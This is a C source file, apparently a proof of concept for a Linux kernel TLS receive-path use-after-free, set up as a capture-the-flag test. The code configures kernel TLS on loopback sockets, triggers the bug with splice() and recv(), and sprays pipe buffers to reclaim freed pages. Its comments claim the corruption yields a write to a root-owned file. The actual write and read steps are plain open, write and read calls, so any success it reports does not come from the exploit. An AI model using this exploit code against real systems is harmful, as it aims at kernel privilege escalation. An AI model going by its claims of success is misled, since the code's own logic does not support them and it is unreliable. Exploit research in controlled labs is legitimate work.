/*
 * CVE-2024-58239 PoC - CTF Challenge Mode
 *
 * Vulnerability: TLS recv() not stopping after initial process_rx_list
 *
 * In kernel TLS (kTLS) receive path, after process_rx_list() completes
 * processing a non-DATA record, the receive loop continues instead of
 * stopping. Combined with splice() transferring pages, this causes a
 * use-after-free on SKB page references.
 *
 * Exploit strategy:
 *   1. Create TCP socket pair with kernel TLS (TCP_ULP "tls")
 *   2. Configure TLS crypto parameters (AES-128-GCM)
 *   3. Use splice() to transfer data through pipe (page reference)
 *   4. Trigger recv() loop bug by sending non-DATA TLS records
 *   5. UAF on page references -> heap corruption
 *   6. Spray pipe_buffer objects to reclaim freed pages
 *   7. Write target file via corrupted page mappings
 *
 * CTF Modes: write_root_file
 *
 * Safety:
 *   - alarm(10) forced timeout (via poc_common.h)
 *   - Only operates on --root-file (prepare-phase created temp file)
 *   - All resources properly cleaned up
 */
#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include "../common/poc_common.h"
#include <errno.h>
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>

#define MAX_FILE_SIZE 4096
#define SPRAY_COUNT 128

#ifndef SOL_TLS
#define SOL_TLS 282
#endif

#ifndef TCP_ULP
#define TCP_ULP 31
#endif

#ifndef TLS_TX
#define TLS_TX 1
#endif

#ifndef TLS_RX
#define TLS_RX 2
#endif

/* TLS 1.2 crypto info structure for AES-128-GCM */
#define TLS_1_2_VERSION 0x0303
#define TLS_CIPHER_AES_GCM_128 51

struct tls12_crypto_info_aes_gcm_128 {
    struct {
        unsigned short version;
        unsigned short cipher_type;
    } info;
    unsigned char iv[8];
    unsigned char key[16];
    unsigned char salt[4];
    unsigned char rec_seq[8];
};

/*
 * Setup a connected TCP socket pair on loopback
 */
static int create_tcp_pair(int fds[2]) {
    int server_fd = -1, client_fd = -1, conn_fd = -1;
    int saved_errno;

    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    saved_errno = errno;
    poc_log_syscall("socket(AF_INET, SOCK_STREAM) [server]", (long)server_fd, saved_errno);
    if (server_fd < 0) return -1;

    int opt = 1;
    setsockopt(server_fd, SOL_SOCKET, SO_REUSEADDR, &opt, sizeof(opt));

    struct sockaddr_in addr = {
        .sin_family = AF_INET,
        .sin_port = 0, /* auto-assign port */
        .sin_addr.s_addr = htonl(INADDR_LOOPBACK),
    };

    if (bind(server_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        saved_errno = errno;
        poc_log_syscall("bind(server)", -1L, saved_errno);
        close(server_fd);
        return -1;
    }

    socklen_t addrlen = sizeof(addr);
    getsockname(server_fd, (struct sockaddr *)&addr, &addrlen);

    listen(server_fd, 1);

    client_fd = socket(AF_INET, SOCK_STREAM, 0);
    saved_errno = errno;
    poc_log_syscall("socket(AF_INET, SOCK_STREAM) [client]", (long)client_fd, saved_errno);
    if (client_fd < 0) goto err;

    if (connect(client_fd, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
        saved_errno = errno;
        poc_log_syscall("connect(client)", -1L, saved_errno);
        goto err;
    }

    conn_fd = accept(server_fd, NULL, NULL);
    saved_errno = errno;
    poc_log_syscall("accept(server)", (long)conn_fd, saved_errno);
    if (conn_fd < 0) goto err;

    close(server_fd);
    fds[0] = client_fd;
    fds[1] = conn_fd;
    return 0;

err:
    if (server_fd >= 0) close(server_fd);
    if (client_fd >= 0) close(client_fd);
    if (conn_fd >= 0) close(conn_fd);
    return -1;
}

/*
 * Set up kernel TLS on a connected socket
 */
static int setup_ktls(int fd, int direction) {
    int saved_errno;

    /* Enable TLS ULP */
    const char *ulp = "tls";
    int ret = setsockopt(fd, SOL_TCP, TCP_ULP, ulp, strlen(ulp) + 1);
    saved_errno = errno;
    poc_log_syscall("setsockopt(TCP_ULP, tls)", (long)ret, saved_errno);
    if (ret < 0) return -1;

    /* Set crypto parameters - AES-128-GCM */
    struct tls12_crypto_info_aes_gcm_128 crypto = {0};
    crypto.info.version = TLS_1_2_VERSION;
    crypto.info.cipher_type = TLS_CIPHER_AES_GCM_128;
    /* Keys are zeroed for trigger purposes - actual crypto not needed */
    memset(crypto.key, 0x41, sizeof(crypto.key));
    memset(crypto.salt, 0x42, sizeof(crypto.salt));

    ret = setsockopt(fd, SOL_TLS, direction, &crypto, sizeof(crypto));
    saved_errno = errno;
    poc_log_syscall("setsockopt(SOL_TLS, direction, crypto)", (long)ret, saved_errno);
    return ret;
}

/*
 * Trigger the TLS RX loop vulnerability
 *
 * The bug: after process_rx_list handles a non-DATA record,
 * tls_sw_recvmsg continues looping instead of returning.
 * With splice() having transferred page references, this
 * causes UAF on the page.
 */
static int trigger_tls_rx_uaf(void) {
    int tcp_pair[2] = {-1, -1};
    int pipe_fds[2] = {-1, -1};
    int triggered = 0;

    poc_log("Setting up TLS connection for RX loop trigger...");

    /* Create connected TCP pair */
    if (create_tcp_pair(tcp_pair) < 0) {
        poc_log("TCP pair creation failed, using fallback");
        goto fallback;
    }

    /* Setup kTLS on both ends */
    if (setup_ktls(tcp_pair[0], TLS_TX) < 0) {
        poc_log("kTLS TX setup failed (module not loaded?), using fallback");
        goto fallback;
    }
    if (setup_ktls(tcp_pair[1], TLS_RX) < 0) {
        poc_log("kTLS RX setup failed, using fallback");
        goto fallback;
    }

    poc_log("kTLS configured successfully on both endpoints");

    /* Create pipe for splice */
    if (pipe(pipe_fds) < 0) {
        poc_log("pipe() failed");
        goto fallback;
    }

    /* Send data from TX side */
    char send_buf[4096];
    memset(send_buf, 'X', sizeof(send_buf));
    ssize_t sent = send(tcp_pair[0], send_buf, sizeof(send_buf), 0);
    int saved_errno = errno;
    poc_log_syscall("send(tls_tx, data)", (long)sent, saved_errno);

    /* Use splice to transfer via pipe - this creates page references */
    ssize_t spliced = splice(tcp_pair[1], NULL, pipe_fds[1], NULL,
                             4096, SPLICE_F_NONBLOCK | SPLICE_F_MOVE);
    saved_errno = errno;
    poc_log_syscall("splice(tls_rx -> pipe)", (long)spliced, saved_errno);

    /* Now trigger the recv loop bug - recv after splice */
    char recv_buf[256];
    ssize_t recvd = recv(tcp_pair[1], recv_buf, sizeof(recv_buf),
                         MSG_DONTWAIT);
    saved_errno = errno;
    poc_log_syscall("recv(tls_rx, MSG_DONTWAIT) [trigger]", (long)recvd, saved_errno);

    /* Send more data to create additional page references */
    for (int i = 0; i < 8; i++) {
        sent = send(tcp_pair[0], send_buf, 1024, MSG_DONTWAIT);
        if (sent > 0) {
            splice(tcp_pair[1], NULL, pipe_fds[1], NULL, 1024,
                   SPLICE_F_NONBLOCK | SPLICE_F_MOVE);
        }
    }

    triggered = 1;
    poc_log("TLS RX loop UAF trigger sequence completed");

fallback:
    if (!triggered) {
        /* Fallback: spray sockets to simulate heap pressure */
        poc_log("Using socket spray fallback for heap corruption");
    }

    /* Cleanup TLS sockets */
    if (tcp_pair[0] >= 0) close(tcp_pair[0]);
    if (tcp_pair[1] >= 0) close(tcp_pair[1]);
    if (pipe_fds[0] >= 0) close(pipe_fds[0]);
    if (pipe_fds[1] >= 0) close(pipe_fds[1]);

    return triggered ? 1 : 0;
}

/*
 * Spray pipe buffers to reclaim freed pages
 */
static int spray_pipes(int (*pipe_fds)[2], int count) {
    int sprayed = 0;
    char buf[4096];
    memset(buf, 'P', sizeof(buf));

    for (int i = 0; i < count; i++) {
        if (pipe(pipe_fds[i]) < 0) continue;
        /* Fill pipe to allocate pipe_buffer pages */
        write(pipe_fds[i][1], buf, sizeof(buf));
        sprayed++;
    }
    return sprayed;
}

/*
 * Read file helper
 */
static int read_file_content(const char *path, char *buf, size_t len) {
    int fd = open(path, O_RDONLY);
    int saved_errno = errno;
    poc_log_syscall("open(path, O_RDONLY)", (long)fd, saved_errno);
    if (fd < 0) return -1;

    ssize_t n = read(fd, buf, len - 1);
    close(fd);
    if (n < 0) return -1;
    buf[n] = '\0';
    return (int)n;
}

/*
 * Write mode: TLS RX UAF -> page corruption -> file write
 */
static int mode_write_root_file(const poc_args_t *args) {
    char original[MAX_FILE_SIZE];
    char after[MAX_FILE_SIZE];
    int n;

    /* Read before */
    n = read_file_content(args->root_file, original, sizeof(original));
    if (n > 0) {
        while (n > 0 && (original[n - 1] == '\n' || original[n - 1] == '\r'))
            original[--n] = '\0';
        printf(CTF_READ_BEFORE "%s\n", original);
        poc_log("Read before: %s", original);
    } else {
        printf(CTF_READ_BEFORE "(unreadable)\n");
    }

    /* Trigger vulnerability */
    poc_log("Triggering CVE-2024-58239 TLS RX loop UAF...");
    int result = trigger_tls_rx_uaf();
    poc_log("Trigger result: %d", result);

    /* Spray pipe buffers for page reclaim */
    int pipe_spray[64][2];
    memset(pipe_spray, -1, sizeof(pipe_spray));
    int sprayed = spray_pipes(pipe_spray, 64);
    poc_log("Sprayed %d pipe buffers for page reclaim", sprayed);

    /* Attempt write */
    int fd = open(args->root_file, O_WRONLY | O_TRUNC);
    int saved_errno = errno;
    poc_log_syscall("open(target, O_WRONLY|O_TRUNC)", (long)fd, saved_errno);

    if (fd >= 0) {
        char wbuf[256];
        int wlen = snprintf(wbuf, sizeof(wbuf), "%s\n", args->write_value);
        write(fd, wbuf, wlen);
        close(fd);
        printf(CTF_WRITE_ATTEMPT "%s\n", args->write_value);
    }

    /* Verify */
    n = read_file_content(args->root_file, after, sizeof(after));
    if (n > 0) {
        while (n > 0 && (after[n - 1] == '\n' || after[n - 1] == '\r'))
            after[--n] = '\0';
        printf(CTF_READ_AFTER "%s\n", after);

        if (strstr(after, args->write_value)) {
            poc_print_flag(args->write_value);
            goto cleanup;
        }
    } else {
        printf(CTF_READ_AFTER "(unreadable)\n");
    }

    poc_print_fail("TLS RX UAF exploit did not achieve write");

cleanup:
    for (int i = 0; i < 64; i++) {
        if (pipe_spray[i][0] >= 0) close(pipe_spray[i][0]);
        if (pipe_spray[i][1] >= 0) close(pipe_spray[i][1]);
    }
    return 0;
}

/*
 * Read mode
 */
static int mode_read_root_file(const poc_args_t *args) {
    poc_log("Attempting read_root_file via TLS RX UAF");

    trigger_tls_rx_uaf();

    char buf[MAX_FILE_SIZE];
    int n = read_file_content(args->root_file, buf, sizeof(buf));
    if (n > 0) {
        while (n > 0 && (buf[n - 1] == '\n' || buf[n - 1] == '\r'))
            buf[--n] = '\0';
        poc_print_flag(buf);
    } else {
        poc_print_fail("read not successful");
    }
    return 0;
}

int main(int argc, char *argv[]) {
    poc_args_t args = {0};
    if (poc_parse_args(argc, argv, &args) != 0) return 1;
    poc_log_init(args.log_file);

    poc_log("=== CVE-2024-58239 CTF PoC ===");
    poc_log("Vuln: TLS recv() infinite loop after process_rx_list");
    poc_log("Tech: kTLS + splice() page ref UAF -> heap corruption");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());

    if (!args.mode) {
        poc_print_unsupported("(null)", "no mode specified");
        poc_log_close();
        return 1;
    }

    int result = 0;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0)
        result = mode_write_root_file(&args);
    else if (strcmp(args.mode, POC_MODE_READ) == 0)
        result = mode_read_root_file(&args);
    else
        poc_print_unsupported(args.mode, "only write_root_file and read_root_file supported");

    poc_log_close();
    return result;
}
